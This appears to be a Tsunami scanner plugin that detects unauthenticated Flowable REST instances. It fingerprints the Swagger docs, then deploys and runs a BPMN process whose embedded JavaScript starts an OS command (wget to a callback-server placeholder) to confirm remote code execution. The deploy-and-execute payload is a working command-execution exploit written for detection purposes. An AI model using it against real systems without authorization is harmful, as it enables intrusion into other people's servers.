# proto-file: proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "Flowable_ExposedUI"
  author: "lanceD00M"
  version: "0.1"
}

finding: {
  main_id: {
    publisher: "GOOGLE"
    value: "FLOWABLE_EXPOSED_UI"
  }
  title: "Exposed Flowable instance"
  description: "Flowable instance is exposed and can be used to compromise the system."
  recommendation:
    "Configure authentication or ensure the Flowable instance is not exposed "
    "to the network. See "
    "https://www.flowable.com/open-source/docs/header-rest/#installation-and-authentication."
  severity: CRITICAL
}

###########
# ACTIONS #
###########

actions: {
  name: "flowable_exposed_ui_fingerprint"
  http_request: {
    method: GET
    uri: "/flowable-rest/docs/"
    response: {
      http_status: 200
      expect_all: {
        conditions: { body {} contains: 'case "specfile/process/flowable-swagger-process.json":' }
        conditions: { body {} contains: 'case "specfile/dmn/flowable-swagger-decision.json":' }
      }
    }
  }
}

actions: {
  name: "deploy_tsunami_process"
  http_request: {
    method: POST
    uri: "/flowable-rest/service/repository/deployments"
    headers: [
      { name: "Content-Type" value: "multipart/form-data; boundary=------------------------gxyhRpqEx2dfbXUDrMqEEL" }
    ]
    data: '--------------------------gxyhRpqEx2dfbXUDrMqEEL\r\nContent-Disposition: form-data; name="file"; filename="jsScript.bpmn"\r\nContent-Type: application/octet-stream\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"\nxmlns:flowable="http://flowable.org/bpmn"\ntargetNamespace="Examples">\n\n<process id="jsScriptProcess" name="JavaScript Script Process">\n<startEvent id="start" />\n<sequenceFlow sourceRef="start" targetRef="scriptTask" />\n<scriptTask id="scriptTask" name="Execute Command via JavaScript"\nscriptFormat="javascript"\nflowable:autoStoreVariables="true">\n<script>\nvar ProcessBuilder = Java.type(\'java.lang.ProcessBuilder\');\nvar Arrays = Java.type(\'java.util.Arrays\');\nvar Scanner = Java.type(\'java.util.Scanner\');\n\nvar processBuilder = new ProcessBuilder(Arrays.asList(\'wget\', \'{{ T_CBS_URI }}\'));\nvar process = processBuilder.start();\n\nvar scanner = new Scanner(process.getInputStream()).useDelimiter("\\A");\nvar result = scanner.hasNext() ? scanner.next() : "";\n\nexecution.setVariable(\'commandOutput\', result);\n</script>\n</scriptTask>\n<sequenceFlow sourceRef="scriptTask" targetRef="end" />\n<endEvent id="end" />\n</process>\n\n</definitions>\n\r\n--------------------------gxyhRpqEx2dfbXUDrMqEEL--\r\n'
    response: {
      http_status: 201
      expect_all: {
        conditions: { body {} contains: '"id"' }
        conditions: { body {} contains: '"name"' }
        conditions: { body {} contains: '"deploymentTime"' }
      }
    }
  }
}

actions: {
  name: "execute_tsunami_process"
  http_request: {
    method: POST
    uri: "/flowable-rest/service/runtime/process-instances"
    data: '{"processDefinitionKey": "jsScriptProcess"}'
    headers: [
      { name: "Content-Type" value: "application/json" }
    ]
    response: {
      http_status: 201
      expect_all: {
        conditions: { body {} contains: '"id"' }
        conditions: { body {} contains: '"processDefinitionId"' }
        conditions: { body {} contains: '"processDefinitionDescription"' }
        conditions: { body {} contains: '"value"' }
      }
    }
  }
}

actions: {
  name: "sleep"
  utility: { sleep: { duration_ms: 1000 } }
}

actions: {
  name: "check_callback_server_logs"
  callback_server: { action_type: CHECK }
}


#############
# WORKFLOWS #
#############
config {
  debug: true
}

workflows: {
  actions: [
    "flowable_exposed_ui_fingerprint",
    "deploy_tsunami_process",
    "execute_tsunami_process",
    "sleep",
    "check_callback_server_logs"
  ]
}
